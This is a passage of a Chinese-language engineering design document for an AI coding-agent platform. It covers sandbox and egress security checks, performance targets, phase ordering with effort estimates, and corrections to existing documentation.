- [ ] **出网白名单不变**：`github.com` 依旧不可达；M2 不因为"要装依赖"而加宽白名单
      （如果新环境确实需要新域名，加白名单是一次**独立的、需要 review 的**变更）；
- [ ] **MCP/技能不能提升权限**：技能不能注册工具；MCP 工具只在 allowlist 内可见；
- [ ] **隔离红线 CI 仍然全绿**（M0 Phase 7 的 workflow 不许因为 M2 变红或被跳过）；
- [ ] **项目技能默认不加载**：未信任仓库的 `.reuben/skills/` 不注入提示词。

### J.4 性能（只列真正的目标，不编造数字）

| 指标 | 目标 |
|---|---|
| 环境构建（缓存命中） | < 10s |
| 环境构建（首次，uncached） | p95 < 10min（含最多 3 轮自愈） |
| 仓库索引（中位仓库，~5k 文件） | < 60s |
| Repo Map 渲染 | < 200ms |
| ContextCompiler 单轮编译（不含索引） | p95 < 200ms |
| 观察窗首屏（已有 transcript） | < 1s |

---

## K. 开发顺序与工作量

**四个部分，13 个 Phase**，按依赖排序。详细实现步骤在 spec 里；这里只给"为什么是这个顺序"与估算。

```
第一部分 · Agent Runtime（先做，因为它决定后面所有东西的形状）
  P1 运行时契约与包拆分 ──► P2 会话与沙箱租约 ──► P3 compaction ──► P4 事件统一
      （3-4d）                 （6-7d）              （3-4d）         （1-2d）
                                        │
第二部分 · Environment（与第一部分并行，接口只在 SandboxSpec.image 上）      │
  P5 定义与推断 ──────► P6 LLM 生成 + 自愈 ──────► P7 缓存/版本/健康检查      │
      （4-5d）              （3-4d）                    （4-5d）            │
                                        │                                   │
第三部分 · 索引与上下文（依赖 P1-P4 的存储与循环，也依赖 P5-P7 的"能跑起来"）  │
  P8 符号索引 ──────► P9 Repo Map ──────► P10 ContextCompiler            ◄──┘
      （4-6d）           （3-4d）             （4-5d）
                                        │
第四部分 · 工具面（依赖 P1 的契约；可与第三部分交错）                        │
  P11 Registry + 7 工具 ──► P12 Skills ──► P13 MCP                        ◄──┘
      （3-4d）                （2-3d）        （3-5d）
```

| Phase | 工作量（人日） | 风险 | 关键路径 |
|---|---|---|---|
| P1 运行时契约与包拆分 | 3–4 | 中（动 M0 已跑通的代码） | ✅ |
| P2 会话持久化 + 沙箱租约（会话长期 / 按需建 / 热着复用 / 空闲回收） | 6–7 | 中（迁移 + 双实现一致 + 回收语义） | ✅ |
| P3 compaction | 3–4 | **高**（切点/估算写错会悄悄烧钱） | ✅ |
| P4 事件统一 | 1–2 | 低 | ✅ |
| P5 环境定义与推断 | 4–5 | 中（devcontainer 子集范围蔓延） | ✅ |
| P6 LLM 生成 + 自愈 | 3–4 | 中（成本失控 / 死循环） | ✅ |
| P7 缓存/版本/健康检查 | 4–5 | 中（缓存键算错 → 静默用旧环境） | ✅ |
| P8 符号索引 | 4–6 | **高**（tree-sitter 多语言覆盖面） | |
| P9 Repo Map | 3–4 | 中（PageRank 权重调参） | |
| P10 ContextCompiler | 4–5 | 中（缓存前缀 + 确定性） | |
| P11 Registry + 工具补齐 | 3–4 | 中（与 pi 行为对拍） | |
| P12 Skills | 2–3 | 低 | |
| P13 MCP | 3–5 | 中（协议 + 管理界面） | |
| **合计** | **43–58 人日** | | |

> 换算成日历时间（单人、AI 辅助、按 M0 的实际节奏）：**6–9 周**。其中 P3（compaction）与 P8（符号索引）
> 是唯一两处"写错了不会立刻报错"的地方（切点算错会静默烧钱；多语言解析覆盖不全只会在某些仓库上退化成没地图），
> 建议给这两个 Phase 单独留出验证时间。

**交付切分建议（M2a / M2b）**：

- **M2a（P1–P10，约 35–46 人日）**：任意仓库能跑起来 + agent 有仓库全局感 + 上下文有预算 + 多轮会话——
  **这是 M2 真正的价值，做完就该停手看看效果**（用 §J.2 的指标对照）；
- **M2b（P11–P13，约 8–12 人日）**：工具面扩展、技能、MCP——
  每一项都是**独立可裁剪**的，效果不佳就砍掉，不影响 M2a 的成立。

**向量检索不在表里**（连 M2b 都不是）：它没有需求驱动，也没有评估集。真出现"符号与全文搜不到、
只能靠语义"的实测案例，再单独立项（见 §H）。

**顺序上的两个"不要"**：

1. **不要先做 P8–P10（索引与编译）**：上下文质量依赖循环与存储的形状，顺序反了要返工两次；
2. **不要跳过 P3（compaction）**：它是唯一能防"长任务悄悄烧钱"的机制，而 M0 的
   "丢旧 tool_result"策略会在真实仓库上很快暴露出"agent 忘了自己做过什么"。

---

## L. 本文对既有文档的修正清单

（实施时同步改，不留"文档说 A、代码做 B"的缝）

| 位置 | 原文 | 修正 | 理由 |
|---|---|---|---|
| README §5 · M1 | 列了 7 项（含状态机、GitHub App、PR） | 划掉 M0 已完成的 3 项，只留 gVisor / 远程沙箱 / 权限 | 清单过时，会让人误以为 M1 是 M2 的前置 |
| README §5 · M2 | "仓库索引（tree-sitter + ripgrep + pgvector）" | ripgrep 是**工具**不是索引；pgvector **移出 M2**（没有需求驱动，也没有评估集） | 分类错误 + 不为一个没有需求的东西排期 |
| README §1 / §3.1 / sandbox.md §D | "一次 Run 一个沙箱，Run 结束即销毁" | 改为**会话的工作区租约**：按需建、热着复用、空闲 TTL 回收、回收前落地 | 讨论需求时不能一句建一个容器 |
| README §3.3 | "超出预算时按优先级驱逐" | 改为"分区预算 + compaction"，驱逐推迟 | 驱逐破坏缓存前缀与回放可比性（§E.1） |
| README §3.3 | "编辑用 diff，不用全文" | 明确为"模型给 old/new 片段，工具精确替换并生成 diff" | 避免被理解成"模型输出 unified diff" |
| README §3.4 | `schema: ZodSchema` | 改为 TypeBox | 与 pi 一致；一份声明三用途（§B.3） |
| README §3.4 | 内置工具：文件读写、bash、**浏览器** | M2 的 7 个工具清单写实（浏览器移到 M3+） | 浏览器在无头沙箱里的收益远低于其成本 |
| sandbox.md §C.2 / prompt.ts | "cmd 是 argv 数组，需要管道就写 bash -lc" | bash **工具**收 shell 字符串，由工具包成 `bash -lc`；沙箱层契约不变 | 模型先验 + 红线不受影响（§F.2 第 1 条） |
| sandbox.md §A / README §3.1 | "Agent 循环在 CP（M0）" | 补充：M2 之后循环在 `packages/agent-runtime`，仍是 CP 内的一个包 | 物理位置没变，包的边界变了 |
| README §5 · M0 | 已完成项 | 补一行"M1 的三项已在 M0 顺带完成" | 让路线图反映真实进度 |
